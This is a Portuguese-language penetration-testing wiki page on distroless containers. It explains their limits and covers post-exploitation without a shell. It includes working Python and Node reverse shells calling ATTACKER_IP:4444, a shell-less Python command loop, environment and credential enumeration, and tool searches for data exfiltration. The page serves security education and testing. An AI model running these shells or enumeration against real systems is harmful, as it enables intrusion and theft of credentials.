# Contêineres Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Uma imagem de contêiner **distroless** é uma imagem que inclui os **componentes mínimos de runtime necessários para executar uma aplicação específica**, enquanto remove intencionalmente as ferramentas de distribuição usuais como gerenciadores de pacotes, shells e grandes conjuntos de utilitários genéricos do userland. Na prática, imagens distroless frequentemente contêm apenas o binário da aplicação ou runtime, suas bibliotecas compartilhadas, bundles de certificados e uma estrutura de sistema de arquivos muito pequena.

O ponto não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela muda o que está disponível **dentro** do sistema de arquivos do contêiner, não como o kernel isola o contêiner. Essa distinção é importante, porque distroless reforça o ambiente principalmente reduzindo o que um atacante pode usar após obter execução de código. Não substitui namespaces, seccomp, capabilities, AppArmor, SELinux ou qualquer outro mecanismo de isolamento em tempo de execução.

## Por que Distroless Existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de pacotes e binários que poderiam conter vulnerabilidades
- o número de ferramentas de pós-exploração disponíveis para um atacante por padrão

É por isso que imagens distroless são populares em deployments de aplicações em produção. Um contêiner que não contém shell, gerenciador de pacotes e quase nenhuma ferramenta genérica costuma ser mais fácil de gerenciar operacionalmente e mais difícil de abusar interativamente após um comprometimento.

Exemplos de famílias de imagens no estilo distroless bem conhecidas incluem:

- Google's distroless images
- Chainguard hardened/minimal images

## O que Distroless Não Significa

Um contêiner distroless **não é**:

- automaticamente rootless
- automaticamente não-privilegiado
- automaticamente somente leitura
- automaticamente protegido por seccomp, AppArmor ou SELinux
- automaticamente seguro contra container escape

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de namespaces do host, bind mounts perigosos ou um socket de runtime montado. Nesse cenário, a imagem pode ser minimalista, mas o contêiner ainda pode ser catastróficamente inseguro. Distroless altera a superfície de ataque do userland, não a fronteira de confiança do kernel.

## Características Operacionais Típicas

Quando você compromete um contêiner distroless, a primeira coisa que normalmente nota é que suposições comuns deixam de ser verdadeiras. Pode não haver `sh`, nem `bash`, nem `ls`, nem `id`, nem `cat`, e às vezes nem mesmo um ambiente baseado em libc que se comporte como sua tradecraft usual espera. Isso afeta tanto ofensiva quanto defesa, porque a falta de ferramentas torna debugging, resposta a incidentes e pós-exploração diferentes.

Os padrões mais comuns são:

- o runtime da aplicação existe, mas pouco mais existe
- payloads baseados em shell falham porque não há shell
- one-liners comuns de enumeração falham porque os binários auxiliares estão ausentes
- proteções do sistema de arquivos, como rootfs somente leitura ou `noexec` em locais tmpfs graváveis, frequentemente também estão presentes

Essa combinação é o que geralmente leva as pessoas a falar sobre "weaponizing distroless".

## Distroless e Pós-Exploração

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Frequentemente é o que vem a seguir. Se a workload explorada fornece execução de código em um runtime de linguagem como Python, Node.js, Java ou Go, você pode ser capaz de executar lógica arbitrária, mas não através dos fluxos de trabalho centrados em shell que são comuns em outros alvos Linux.

Isso significa que a pós-exploração frequentemente se desloca para uma de três direções:

1. **Use the existing language runtime directly** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Bring your own tooling into memory** se o sistema de arquivos for somente leitura ou locais graváveis estiverem montados `noexec`.
3. **Abuse existing binaries already present in the image** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuso

### Enumerar o runtime que você já tem

Em muitos contêineres distroless não existe shell, mas ainda existe um runtime da aplicação. Se o alvo for um serviço Python, o Python está lá. Se o alvo for Node.js, o Node está lá. Isso frequentemente fornece funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e preparar execução em memória sem nunca invocar `/bin/sh`.

Um exemplo simples com Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Um exemplo simples com Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperação de variáveis de ambiente, frequentemente incluindo credenciais ou endpoints de serviço
- enumeração do sistema de arquivos sem `/bin/ls`
- identificação de writable paths e mounted secrets

### Reverse Shell Sem `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, um reverse shell clássico baseado em shell pode falhar imediatamente. Nessa situação, use o runtime da linguagem instalada em vez disso.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` não existir, substitua a última linha por execução direta de comandos acionada por Python ou por um loop REPL do Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Novamente, se `/bin/sh` estiver ausente, use diretamente as APIs de sistema de arquivos, de processo e de rede do Node em vez de iniciar um shell.

### Exemplo completo: Loop de comandos Python sem shell

Se a imagem contém Python, mas não há nenhum shell, um loop interativo simples geralmente é suficiente para manter a capacidade completa de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Isso não requer um binário de shell interativo. O impacto é efetivamente o mesmo que um shell básico do ponto de vista do atacante: execução de comandos, enumeração e preparação de payloads adicionais através do runtime existente.

### Execução de Ferramentas em Memória

Imagens distroless são frequentemente combinadas com:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Essa combinação torna fluxos clássicos de "download binary to disk and run it" pouco confiáveis. Nesses casos, técnicas de execução em memória se tornam a principal solução.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

As técnicas mais relevantes ali são:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binários já presentes na imagem

Algumas imagens distroless ainda contêm binários necessários à operação que se tornam úteis após um comprometimento. Um exemplo repetidamente observado é `openssl`, porque aplicações às vezes precisam dele para tarefas relacionadas a crypto ou TLS.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` estiver presente, ele pode ser usado para:

- conexões TLS de saída
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

O abuso exato depende do que está realmente instalado, mas a ideia geral é que distroless não significa "no tools whatsoever"; significa "far fewer tools than a normal distribution image".

## Checks

O objetivo dessas checks é determinar se a imagem é realmente distroless na prática e quais runtime ou helper binaries ainda estão disponíveis para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
O que é interessante aqui:

- Se não existir shell mas um runtime como Python ou Node estiver presente, a post-exploitation deve pivotar para execução dirigida pelo runtime.
- Se o sistema de arquivos raiz for somente leitura e `/dev/shm` for gravável mas `noexec`, técnicas de execução em memória tornam-se muito mais relevantes.
- Se binários auxiliares como `openssl`, `busybox` ou `java` existirem, eles podem oferecer funcionalidade suficiente para viabilizar acesso adicional.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

O ponto chave é que distroless é uma **propriedade da imagem**, não uma proteção em runtime. Seu valor vem de reduzir o que está disponível dentro do sistema de arquivos após um comprometimento.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
